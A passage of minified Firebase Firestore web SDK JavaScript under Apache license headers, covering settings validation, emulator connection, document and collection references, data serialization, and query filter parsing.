 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function TC(n){const e={};return n.timeoutSeconds!==void 0&&(e.timeoutSeconds=n.timeoutSeconds),e}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const SS=new Map;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function AC(n,e,t){if(!t)throw new we(ie.INVALID_ARGUMENT,`Function ${n}() cannot be called with an empty ${e}.`)}function p9(n,e,t,r){if(e===!0&&r===!0)throw new we(ie.INVALID_ARGUMENT,`${n} and ${t} cannot be used together.`)}function TS(n){if(!Te.isDocumentKey(n))throw new we(ie.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${n} has ${n.length}.`)}function AS(n){if(Te.isDocumentKey(n))throw new we(ie.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${n} has ${n.length}.`)}function ag(n){if(n===void 0)return"undefined";if(n===null)return"null";if(typeof n=="string")return n.length>20&&(n=`${n.substring(0,20)}...`),JSON.stringify(n);if(typeof n=="number"||typeof n=="boolean")return""+n;if(typeof n=="object"){if(n instanceof Array)return"an array";{const e=function(r){return r.constructor?r.constructor.name:null}(n);return e?`a custom ${e} object`:"an object"}}return typeof n=="function"?"a function":Ne()}function Li(n,e){if("_delegate"in n&&(n=n._delegate),!(n instanceof e)){if(e.name===n.constructor.name)throw new we(ie.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const t=ag(n);throw new we(ie.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${t}`)}}return n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bC="firestore.googleapis.com",bS=!0;class xS{constructor(e){var t,r;if(e.host===void 0){if(e.ssl!==void 0)throw new we(ie.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=bC,this.ssl=bS}else this.host=e.host,this.ssl=(t=e.ssl)!==null&&t!==void 0?t:bS;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=Jk;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<HF)throw new we(ie.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}p9("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=TC((r=e.experimentalLongPollingOptions)!==null&&r!==void 0?r:{}),function(s){if(s.timeoutSeconds!==void 0){if(isNaN(s.timeoutSeconds))throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (must not be NaN)`);if(s.timeoutSeconds<5)throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (minimum allowed value is 5)`);if(s.timeoutSeconds>30)throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(r,i){return r.timeoutSeconds===i.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class lg{constructor(e,t,r,i){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new xS({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new we(ie.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new we(ie.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new xS(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=function(r){if(!r)return new SV;switch(r.type){case"firstParty":return new xV(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new we(ie.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(t){const r=SS.get(t);r&&(me("ComponentProvider","Removing Datastore"),SS.delete(t),r.terminate())}(this),Promise.resolve()}}function g9(n,e,t,r={}){var i;const s=(n=Li(n,lg))._getSettings(),o=Object.assign(Object.assign({},s),{emulatorOptions:n._getEmulatorOptions()}),a=`${e}:${t}`;s.host!==bC&&s.host!==a&&Kl("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const l=Object.assign(Object.assign({},s),{host:a,ssl:!1,emulatorOptions:r});if(!da(l,o)&&(n._setSettings(l),r.mockUserToken)){let u,h;if(typeof r.mockUserToken=="string")u=r.mockUserToken,h=Jn.MOCK_USER;else{u=P5(r.mockUserToken,(i=n._app)===null||i===void 0?void 0:i.options.projectId);const f=r.mockUserToken.sub||r.mockUserToken.user_id;if(!f)throw new we(ie.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");h=new Jn(f)}n._authCredentials=new TV(new lk(u,h))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yc{constructor(e,t,r){this.converter=t,this._query=r,this.type="query",this.firestore=e}withConverter(e){return new yc(this.firestore,e,this._query)}}class ar{constructor(e,t,r){this.converter=t,this._key=r,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new ho(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new ar(this.firestore,e,this._key)}}class ho extends yc{constructor(e,t,r){super(e,t,Vv(r)),this._path=r,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new ar(this.firestore,null,new Te(e))}withConverter(e){return new ho(this.firestore,e,this._path)}}function nh(n,e,...t){if(n=xn(n),AC("collection","path",e),n instanceof lg){const r=Mt.fromString(e,...t);return AS(r),new ho(n,null,r)}{if(!(n instanceof ar||n instanceof ho))throw new we(ie.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=n._path.child(Mt.fromString(e,...t));return AS(r),new ho(n.firestore,null,r)}}function rh(n,e,...t){if(n=xn(n),arguments.length===1&&(e=uk.newId()),AC("doc","path",e),n instanceof lg){const r=Mt.fromString(e,...t);return TS(r),new ar(n,null,new Te(r))}{if(!(n instanceof ar||n instanceof ho))throw new we(ie.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=n._path.child(Mt.fromString(e,...t));return TS(r),new ar(n.firestore,n instanceof ho?n.converter:null,new Te(r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kS="AsyncQueue";class CS{constructor(e=Promise.resolve()){this.Vu=[],this.mu=!1,this.fu=[],this.gu=null,this.pu=!1,this.yu=!1,this.wu=[],this.a_=new nC(this,"async_queue_retry"),this.Su=()=>{const r=Bm();r&&me(kS,"Visibility state changed to "+r.visibilityState),this.a_.t_()},this.bu=e;const t=Bm();t&&typeof t.addEventListener=="function"&&t.addEventListener("visibilitychange",this.Su)}get isShuttingDown(){return this.mu}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.Du(),this.vu(e)}enterRestrictedMode(e){if(!this.mu){this.mu=!0,this.yu=e||!1;const t=Bm();t&&typeof t.removeEventListener=="function"&&t.removeEventListener("visibilitychange",this.Su)}}enqueue(e){if(this.Du(),this.mu)return new Promise(()=>{});const t=new as;return this.vu(()=>this.mu&&this.yu?Promise.resolve():(e().then(t.resolve,t.reject),t.promise)).then(()=>t.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.Vu.push(e),this.Cu()))}async Cu(){if(this.Vu.length!==0){try{await this.Vu[0](),this.Vu.shift(),this.a_.reset()}catch(e){if(!gc(e))throw e;me(kS,"Operation failed with retryable error: "+e)}this.Vu.length>0&&this.a_.Xo(()=>this.Cu())}}vu(e){const t=this.bu.then(()=>(this.pu=!0,e().catch(r=>{this.gu=r,this.pu=!1;const i=function(o){let a=o.message||"";return o.stack&&(a=o.stack.includes(o.message)?o.stack:o.message+`
`+o.stack),a}(r);throw ys("INTERNAL UNHANDLED ERROR: ",i),r}).then(r=>(this.pu=!1,r))));return this.bu=t,t}enqueueAfterDelay(e,t,r){this.Du(),this.wu.indexOf(e)>-1&&(t=0);const i=Xv.createAndSchedule(this,e,t,r,s=>this.Fu(s));return this.fu.push(i),i}Du(){this.gu&&Ne()}verifyOperationInProgress(){}async Mu(){let e;do e=this.bu,await e;while(e!==this.bu)}xu(e){for(const t of this.fu)if(t.timerId===e)return!0;return!1}Ou(e){return this.Mu().then(()=>{this.fu.sort((t,r)=>t.targetTimeMs-r.targetTimeMs);for(const t of this.fu)if(t.skipDelay(),e!=="all"&&t.timerId===e)break;return this.Mu()})}Nu(e){this.wu.push(e)}Fu(e){const t=this.fu.indexOf(e);this.fu.splice(t,1)}}class wc extends lg{constructor(e,t,r,i){super(e,t,r,i),this.type="firestore",this._queue=new CS,this._persistenceKey=(i==null?void 0:i.name)||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new CS(e),this._firestoreClient=void 0,await e}}}function xC(n,e){const t=typeof n=="object"?n:v2(),r=typeof n=="string"?n:e||$d,i=Sv(t,"firestore").getImmediate({identifier:r});if(!i._initialized){const s=M5("firestore");s&&g9(i,...s)}return i}function i1(n){if(n._terminated)throw new we(ie.FAILED_PRECONDITION,"The client has already been terminated.");return n._firestoreClient||m9(n),n._firestoreClient}function m9(n){var e,t,r;const i=n._freezeSettings(),s=function(a,l,u,h){return new zV(a,l,u,h.host,h.ssl,h.experimentalForceLongPolling,h.experimentalAutoDetectLongPolling,TC(h.experimentalLongPollingOptions),h.useFetchStreams)}(n._databaseId,((e=n._app)===null||e===void 0?void 0:e.options.appId)||"",n._persistenceKey,i);n._componentsProvider||!((t=i.localCache)===null||t===void 0)&&t._offlineComponentProvider&&(!((r=i.localCache)===null||r===void 0)&&r._onlineComponentProvider)&&(n._componentsProvider={_offline:i.localCache._offlineComponentProvider,_online:i.localCache._onlineComponentProvider}),n._firestoreClient=new c9(n._authCredentials,n._appCheckCredentials,n._queue,s,n._componentsProvider&&function(a){const l=a==null?void 0:a._online.build();return{_offline:a==null?void 0:a._offline.build(l),_online:l}}(n._componentsProvider))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xl{constructor(e){this._byteString=e}static fromBase64String(e){try{return new Xl(Fn.fromBase64String(e))}catch(t){throw new we(ie.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+t)}}static fromUint8Array(e){return new Xl(Fn.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cg{constructor(...e){for(let t=0;t<e.length;++t)if(e[t].length===0)throw new we(ie.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Un(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class s1{constructor(e){this._methodName=e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class o1{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new we(ie.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new we(ie.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return $e(this._lat,e._lat)||$e(this._long,e._long)}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class a1{constructor(e){this._values=(e||[]).map(t=>t)}toArray(){return this._values.map(e=>e)}isEqual(e){return function(r,i){if(r.length!==i.length)return!1;for(let s=0;s<r.length;++s)if(r[s]!==i[s])return!1;return!0}(this._values,e._values)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const y9=/^__.*__$/;class w9{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return this.fieldMask!==null?new ko(e,this.data,this.fieldMask,t,this.fieldTransforms):new Ih(e,this.data,t,this.fieldTransforms)}}class kC{constructor(e,t,r){this.data=e,this.fieldMask=t,this.fieldTransforms=r}toMutation(e,t){return new ko(e,this.data,this.fieldMask,t,this.fieldTransforms)}}function CC(n){switch(n){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw Ne()}}class l1{constructor(e,t,r,i,s,o){this.settings=e,this.databaseId=t,this.serializer=r,this.ignoreUndefinedProperties=i,s===void 0&&this.Bu(),this.fieldTransforms=s||[],this.fieldMask=o||[]}get path(){return this.settings.path}get Lu(){return this.settings.Lu}ku(e){return new l1(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}qu(e){var t;const r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.ku({path:r,Qu:!1});return i.$u(e),i}Uu(e){var t;const r=(t=this.path)===null||t===void 0?void 0:t.child(e),i=this.ku({path:r,Qu:!1});return i.Bu(),i}Ku(e){return this.ku({path:void 0,Qu:!0})}Wu(e){return ep(e,this.settings.methodName,this.settings.Gu||!1,this.path,this.settings.zu)}contains(e){return this.fieldMask.find(t=>e.isPrefixOf(t))!==void 0||this.fieldTransforms.find(t=>e.isPrefixOf(t.field))!==void 0}Bu(){if(this.path)for(let e=0;e<this.path.length;e++)this.$u(this.path.get(e))}$u(e){if(e.length===0)throw this.Wu("Document fields must not be empty");if(CC(this.Lu)&&y9.test(e))throw this.Wu('Document fields cannot begin and end with "__"')}}class v9{constructor(e,t,r){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=r||ig(e)}ju(e,t,r,i=!1){return new l1({Lu:e,methodName:t,zu:r,path:Un.emptyPath(),Qu:!1,Gu:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function ug(n){const e=n._freezeSettings(),t=ig(n._databaseId);return new v9(n._databaseId,!!e.ignoreUndefinedProperties,t)}function RC(n,e,t,r,i,s={}){const o=n.ju(s.merge||s.mergeFields?2:0,e,t,i);c1("Data must be an object, but it was:",o,r);const a=MC(r,o);let l,u;if(s.merge)l=new Rr(o.fieldMask),u=o.fieldTransforms;else if(s.mergeFields){const h=[];for(const f of s.mergeFields){const p=Vy(e,f,t);if(!o.contains(p))throw new we(ie.INVALID_ARGUMENT,`Field '${p}' is specified in your field mask but missing from your input data.`);PC(h,p)||h.push(p)}l=new Rr(h),u=o.fieldTransforms.filter(f=>l.covers(f.field))}else l=null,u=o.fieldTransforms;return new w9(new yr(a),l,u)}class hg extends s1{_toFieldTransform(e){if(e.Lu!==2)throw e.Lu===1?e.Wu(`${this._methodName}() can only appear at the top level of your update data`):e.Wu(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof hg}}function _9(n,e,t,r){const i=n.ju(1,e,t);c1("Data must be an object, but it was:",i,r);const s=[],o=yr.empty();xo(r,(l,u)=>{const h=u1(e,l,t);u=xn(u);const f=i.Uu(h);if(u instanceof hg)s.push(h);else{const p=bh(u,f);p!=null&&(s.push(h),o.set(h,p))}});const a=new Rr(s);return new kC(o,a,i.fieldTransforms)}function E9(n,e,t,r,i,s){const o=n.ju(1,e,t),a=[Vy(e,r,t)],l=[i];if(s.length%2!=0)throw new we(ie.INVALID_ARGUMENT,`Function ${e}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let p=0;p<s.length;p+=2)a.push(Vy(e,s[p])),l.push(s[p+1]);const u=[],h=yr.empty();for(let p=a.length-1;p>=0;--p)if(!PC(u,a[p])){const w=a[p];let x=l[p];x=xn(x);const k=o.Uu(w);if(x instanceof hg)u.push(w);else{const I=bh(x,k);I!=null&&(u.push(w),h.set(w,I))}}const f=new Rr(u);return new kC(h,f,o.fieldTransforms)}function I9(n,e,t,r=!1){return bh(t,n.ju(r?4:3,e))}function bh(n,e){if(NC(n=xn(n)))return c1("Unsupported field value:",e,n),MC(n,e);if(n instanceof s1)return function(r,i){if(!CC(i.Lu))throw i.Wu(`${r._methodName}() can only be used with update() and set()`);if(!i.path)throw i.Wu(`${r._methodName}() is not currently supported inside arrays`);const s=r._toFieldTransform(i);s&&i.fieldTransforms.push(s)}(n,e),null;if(n===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),n instanceof Array){if(e.settings.Qu&&e.Lu!==4)throw e.Wu("Nested arrays are not supported");return function(r,i){const s=[];let o=0;for(const a of r){let l=bh(a,i.Ku(o));l==null&&(l={nullValue:"NULL_VALUE"}),s.push(l),o++}return{arrayValue:{values:s}}}(n,e)}return function(r,i){if((r=xn(r))===null)return{nullValue:"NULL_VALUE"};if(typeof r=="number")return uF(i.serializer,r);if(typeof r=="boolean")return{booleanValue:r};if(typeof r=="string")return{stringValue:r};if(r instanceof Date){const s=yn.fromDate(r);return{timestampValue:Yd(i.serializer,s)}}if(r instanceof yn){const s=new yn(r.seconds,1e3*Math.floor(r.nanoseconds/1e3));return{timestampValue:Yd(i.serializer,s)}}if(r instanceof o1)return{geoPointValue:{latitude:r.latitude,longitude:r.longitude}};if(r instanceof Xl)return{bytesValue:Hk(i.serializer,r._byteString)};if(r instanceof ar){const s=i.databaseId,o=r.firestore._databaseId;if(!o.isEqual(s))throw i.Wu(`Document reference is for database ${o.projectId}/${o.database} but should be for database ${s.projectId}/${s.database}`);return{referenceValue:$v(r.firestore._databaseId||i.databaseId,r._key.path)}}if(r instanceof a1)return function(o,a){return{mapValue:{fields:{[wk]:{stringValue:_k},[Hd]:{arrayValue:{values:o.toArray().map(u=>{if(typeof u!="number")throw a.Wu("VectorValues must only contain numeric values.");return Fv(a.serializer,u)})}}}}}}(r,i);throw i.Wu(`Unsupported field value: ${ag(r)}`)}(n,e)}function MC(n,e){const t={};return fk(n)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):xo(n,(r,i)=>{const s=bh(i,e.qu(r));s!=null&&(t[r]=s)}),{mapValue:{fields:t}}}function NC(n){return!(typeof n!="object"||n===null||n instanceof Array||n instanceof Date||n instanceof yn||n instanceof o1||n instanceof Xl||n instanceof ar||n instanceof s1||n instanceof a1)}function c1(n,e,t){if(!NC(t)||!function(i){return typeof i=="object"&&i!==null&&(Object.getPrototypeOf(i)===Object.prototype||Object.getPrototypeOf(i)===null)}(t)){const r=ag(t);throw r==="an object"?e.Wu(n+" a custom object"):e.Wu(n+" "+r)}}function Vy(n,e,t){if((e=xn(e))instanceof cg)return e._internalPath;if(typeof e=="string")return u1(n,e);throw ep("Field path arguments must be of type string or ",n,!1,void 0,t)}const S9=new RegExp("[~\\*/\\[\\]]");function u1(n,e,t){if(e.search(S9)>=0)throw ep(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,n,!1,void 0,t);try{return new cg(...e.split("."))._internalPath}catch{throw ep(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,n,!1,void 0,t)}}function ep(n,e,t,r,i){const s=r&&!r.isEmpty(),o=i!==void 0;let a=`Function ${e}() called with invalid data`;t&&(a+=" (via `toFirestore()`)"),a+=". ";let l="";return(s||o)&&(l+=" (found",s&&(l+=` in field ${r}`),o&&(l+=` in document ${i}`),l+=")"),new we(ie.INVALID_ARGUMENT,a+n+l)}function PC(n,e){return n.some(t=>t.isEqual(e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class LC{constructor(e,t,r,i,s){this._firestore=e,this._userDataWriter=t,this._key=r,this._document=i,this._converter=s}get id(){return this._key.path.lastSegment()}get ref(){return new ar(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new T9(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const t=this._document.data.field(h1("DocumentSnapshot.get",e));if(t!==null)return this._userDataWriter.convertValue(t)}}}class T9 extends LC{data(){return super.data()}}function h1(n,e){return typeof e=="string"?u1(n,e):e instanceof cg?e._internalPath:e._delegate._internalPath}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function A9(n){if(n.limitType==="L"&&n.explicitOrderBy.length===0)throw new we(ie.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class f1{}class b9 extends f1{}function x9(n,e,...t){let r=[];e instanceof f1&&r.push(e),r=r.concat(t),function(s){const o=s.filter(l=>l instanceof d1).length,a=s.filter(l=>l instanceof fg).length;if(o>1||o>0&&a>0)throw new we(ie.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r);for(const i of r)n=i._apply(n);return n}class fg extends b9{constructor(e,t,r){super(),this._field=e,this._op=t,this._value=r,this.type="where"}static _create(e,t,r){return new fg(e,t,r)}_apply(e){const t=this._parse(e);return DC(e._query,t),new yc(e.firestore,e.converter,Cy(e._query,t))}_parse(e){const t=ug(e.firestore);return function(s,o,a,l,u,h,f){let p;if(u.isKeyField()){if(h==="array-contains"||h==="array-contains-any")throw new we(ie.INVALID_ARGUMENT,`Invalid Query. You can't perform '${h}' queries on documentId().`);if(h==="in"||h==="not-in"){MS(f,h);const x=[];for(const k of f)x.push(RS(l,s,k));p={arrayValue:{values:x}}}else p=RS(l,s,f)}else h!=="in"&&h!=="not-in"&&h!=="array-contains-any"||MS(f,h),p=I9(a,o,f,h==="in"||h==="not-in");return dn.create(u,h,p)}(e._query,"where",t,e.firestore._databaseId,this._field,this._op,this._value)}}function k9(n,e,t){const r=e,i=h1("where",n);return fg._create(i,r,t)}class d1 extends f1{constructor(e,t){super(),this.type=e,this._queryConstraints=t}static _create(e,t){return new d1(e,t)}_parse(e){const t=this._queryConstraints.map(r=>r._parse(e)).filter(r=>r.getFilters().length>0);return t.length===1?t[0]:yi.create(t,this._getOperator())}_apply(e){const t=this._parse(e);return t.getFilters().length===0?e:(function(i,s){let o=i;const a=s.getFlattenedFilters();for(const l of a)DC(o,l),o=Cy(o,l)}(e._query,t),new yc(e.firestore,e.converter,Cy(e._query,t)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return this.type==="and"?"and":"or"}}function RS(n,e,t){if(typeof(t=xn(t))=="string"){if(t==="")throw new we(ie.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!kk(e)&&t.indexOf("/")!==-1)throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${t}' contains a '/' character.`);const r=e.path.child(Mt.fromString(t));if(!Te.isDocumentKey(r))throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying a 